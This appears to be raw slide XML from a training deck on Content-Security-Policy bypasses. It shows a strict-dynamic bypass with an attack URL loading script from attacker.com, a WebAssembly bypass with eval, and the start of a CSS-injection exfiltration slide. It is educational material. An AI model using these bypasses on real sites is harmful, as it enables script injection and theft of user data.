          <a:bodyPr wrap="squar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Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5479733" y="2007156"/>
            <a:ext cx="3670697" cy="3421142"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 715"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5642610" y="2170033"/>
            <a:ext cx="2037278" cy="254556"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable HTML:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5642610" y="2556272"/>
            <a:ext cx="3344942" cy="2709148"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 902"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5634514" y="2556272"/>
            <a:ext cx="3361134" cy="2709148"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 902"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5797391" y="2678430"/>
            <a:ext cx="3035379" cy="2464832"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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&lt;script nonce="r4nd0m"&gt;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const urlParams = new URLSearchParams(window.location.search);</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const userInput = urlParams.get('input');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const script = document.createElement('script');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script.src = userInput;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  document.body.appendChild(script);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>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&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267468" y="2007156"/>
            <a:ext cx="3670697" cy="3421142"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 715"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9430345" y="2170033"/>
            <a:ext cx="2037278" cy="254556"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9430345" y="2556272"/>
            <a:ext cx="3344942" cy="692467"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3531"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9422249" y="2556272"/>
            <a:ext cx="3361134" cy="692467"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3531"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9585127" y="2678430"/>
            <a:ext cx="3035379" cy="448151"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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https://victim.com/?input=https://attacker.com/evil.js</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691997" y="5559981"/>
            <a:ext cx="11246287" cy="1405890"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1739"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C9DDE9"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="19" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1854875" y="5737503"/>
            <a:ext cx="254556" cy="203716"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2272308" y="5717738"/>
            <a:ext cx="2037278" cy="254556"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why it works:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2272308" y="6089333"/>
            <a:ext cx="10503098" cy="672260"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>strict-dynamic trusts scripts created by nonce-protected scripts</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Dynamically created script inherits trust</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Can load from any domain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48833" y="1396246"/>
            <a:ext cx="5475803" cy="386477"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Technique 14: WebAssembly Bypass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3048833" y="1951196"/>
            <a:ext cx="1545669" cy="193119"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable CSP:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3048833" y="2220158"/>
            <a:ext cx="4115395" cy="338138"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5486"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3042761" y="2220158"/>
            <a:ext cx="4127540" cy="338138"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5486"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3166348" y="2312789"/>
            <a:ext cx="3880366" cy="152876"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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Content-Security-Policy: script-src 'self' 'wasm-unsafe-eval'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3048833" y="2634139"/>
            <a:ext cx="1545669" cy="193119"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3048833" y="2855916"/>
            <a:ext cx="4115395" cy="3854291"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 481"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3042761" y="2855916"/>
            <a:ext cx="4127540" cy="3854291"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 481"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3166348" y="2948546"/>
            <a:ext cx="3880366" cy="3669030"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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const wasmCode = new Uint8Array([</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0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x07, 0x01, 0x60,</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0x02, 0x7e, 0x7e, 0x00, 0x02, 0x16, 0x01, 0x07, 0x69, 0x6d, 0x70, 0x6f,</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0x72, 0x74, 0x73, 0x0a, 0x6a, 0x73, 0x46, 0x75, 0x6e, 0x63, 0x00, 0x00,</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0x03, 0x02, 0x01, 0x00, 0x07, 0x07, 0x01, 0x03, 0x63, 0x61, 0x6c, 0x6c,</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0x4a, 0x73, 0x00, 0x00, 0x0a, 0x08, 0x01, 0x06, 0x00, 0x20, 0x00, 0x20,</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0x01, 0x6a, 0x0b</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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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const wasmModule = new WebAssembly.Module(wasmCode);</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const wasmInstance = new WebAssembly.Instance(wasmModule, {</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imports: {</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jsFunc: (arg1, arg2) =&gt; {</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eval(`alert('WASM bypassed CSP! ${arg1}, ${arg2}')`);</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  },</a:t>
            </a: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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2EFE8"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>wasmInstance.exports.callJs(10, 20);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7384494" y="1883807"/>
            <a:ext cx="4293513" cy="4949428"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 432"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7508081" y="1951196"/>
            <a:ext cx="1545669" cy="193119"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why it works:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7508081" y="2211705"/>
            <a:ext cx="4046339" cy="458592"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F6F0E4"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>WebAssembly can call JavaScript functions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F6F0E4"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>wasm-unsafe-eval allows compilation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F6F0E4"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Bypasses script-src restrictions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1219200"/>
            <a:ext cx="6201847"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Technique 15: CSS Injection (Data Exfiltration)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1596152"/>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124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable CSP:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1858328"/>
            <a:ext cx="7825502" cy="306110"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5558"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="1858328"/>
            <a:ext cx="7836694" cy="306110"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5558"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="1943338"/>
            <a:ext cx="7609999" cy="136088"/>
